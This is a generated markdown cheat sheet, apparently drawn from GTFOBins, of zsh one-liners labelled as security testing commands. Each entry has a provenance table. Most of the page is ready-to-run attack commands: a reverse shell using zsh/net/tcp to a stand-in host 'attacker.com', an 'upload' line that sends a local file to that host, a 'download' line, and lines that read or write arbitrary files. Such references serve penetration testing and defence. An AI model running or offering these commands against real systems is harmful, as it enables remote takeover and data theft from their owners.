---
parsed_by: focuslocust
source: commands
type: generated
---
# zsh Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## zsh

Tool page: [zsh](../../tools/linux/zsh.md)

### download

```text
zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;echo -n "$(<&$REPLY)" >/path/to/output-file'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/zsh` |
| Evidence | Function example preserved from source parser. |

### file-read

```text
zsh -c 'echo "$(</path/to/input-file)"'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/zsh` |
| Evidence | Function example preserved from source parser. |

### file-read

```text
zsh -c '</path/to/input-file'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/zsh` |
| Evidence | Function example preserved from source parser. |

### file-write

```text
zsh -c 'echo DATA >/path/to/output-file'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/zsh` |
| Evidence | Function example preserved from source parser. |

### inherit

```text
zsh -c '</etc/hosts'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/zsh` |
| Evidence | Function example preserved from source parser. |

### reverse-shell

```text
zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/zsh` |
| Evidence | Function example preserved from source parser. |

### shell

```text
zsh
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/zsh` |
| Evidence | Function example preserved from source parser. |

### upload

```text
zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;echo -n "$(</path/to/input-file)" >&$REPLY'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/zsh` |
| Evidence | Function example preserved from source parser. |
